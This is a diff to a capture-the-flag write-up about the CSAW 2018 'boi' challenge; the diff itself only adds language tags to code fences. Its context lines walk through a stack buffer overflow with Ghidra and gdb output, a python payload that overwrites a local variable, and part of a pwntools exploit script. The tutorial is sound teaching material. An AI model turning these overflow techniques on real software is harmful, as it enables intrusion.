@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $    file boi
 boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
 $    pwn checksec boi [*] '/Hackery/pod/modules/bof_variable/csaw18_boi/boi'
@@ -19,7 +19,7 @@ Mon Jun 10 22:07:51 EDT 2019
 
 So we can see that we are dealing with a 64 bit binary with a Stack Canary and Non-Executable stack (those are two binary mitigations that will be discussed later). When we run the binary, we see that we are prompted for input (which we gave it `15935728`). It then provided us with the time and the date. When we look at the main function in Ghidra we see this:
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -56,14 +56,14 @@ So we can see the program prints the string `Are you a big boiiiii??` with `puts
 
 We can see that the value that it is being assigned is `0xdeadbeef`:
 
-```
+```nasm
         0040067e c7 45 e4        MOV        dword ptr [RBP + target],0xdeadbeef
                  ef be ad de
 ```
 
 We can also see that the value that it is being compared to is `0xcaf3baee`:
 
-```
+```nasm
         004006a5 8b 45 e4        MOV        EAX,dword ptr [RBP + target]
         004006a8 3d ee ba        CMP        EAX,0xcaf3baee
                  f3 ca
@@ -71,7 +71,7 @@ We can also see that the value that it is being compared to is `0xcaf3baee`:
 
 Now to see what our input can reach, we can look at the stack layout in Ghidra. To see this you can just double click on any of the variables where they are declared:
 
-```
+```c
                              **************************************************************
                              *                          FUNCTION                          *
                              **************************************************************
@@ -97,7 +97,7 @@ Now to see what our input can reach, we can look at the stack layout in Ghidra. 
 
 Here we can see that according to Ghidra input is stored at offset `-0x38`. We can see that target is stored at offset `-0x24`. This means that there is a `0x14` byte difference between the two values. Sice we can write `0x18` bytes, that means we can fill up the `0x14` byte difference and overwrite four bytes (`0x18 - 0x14 = 4`) of `target`, and since integers are four bytes we can overwrite. Here the bug is it is letting us write `0x18` bytes worth of data to a `0x14` byte space, and `0x4` bytes of data are overflowing into the `target` variable which gives us the ability to change what it is. Taking a look at the memory layout in gdb gives us a better description. We set a breakpoint for directly after the `read` call and see what the memory looks like:
 
-```
+```gdb
 gdb ./boi
 GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
 Copyright (C) 2018 Free Software Foundation, Inc.
@@ -184,7 +184,7 @@ gef➤  x/10g 0x7fffffffde80
 
 Here we can see that our input `15935728` is `0x14` bytes away. When we give the input `00000000000000000000` + p32(`0xcaf3baee`). We need the hex address to be in least endian (least significant byte first) because that is how the elf will read in data, so we have to pack it that way in order for the binary to read it properly:
 
-```
+```gdb
 $    python -c 'print "0"*0x14 + "\xee\xba\xf3\xca"' > input
 $    gdb ./boi
 GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
@@ -274,7 +274,7 @@ gef➤  x/10g 0x7fffffffde80
 
 Here we can see that we have overwritten the integer with the value `0xcaf3baee`. When we continue onto the `cmp` instruction, we can see that we will pass the check:
 
-```
+```gdb
 gef➤  b *0x4006a8
 Breakpoint 2 at 0x4006a8
 gef➤  c
@@ -331,7 +331,7 @@ $1 = 0xcaf3baee
 ```
 
 With all of that, we can write an exploit for this challenge:
-```
+```python
 # Import pwntools
 from pwn import *
 
@@ -352,7 +352,7 @@ target.interactive()
 ```
 
 When we run it:
-```
+```console
 $    python exploit.py
 [+] Starting local process './boi': pid 9075
 [*] Switching to interactive mode
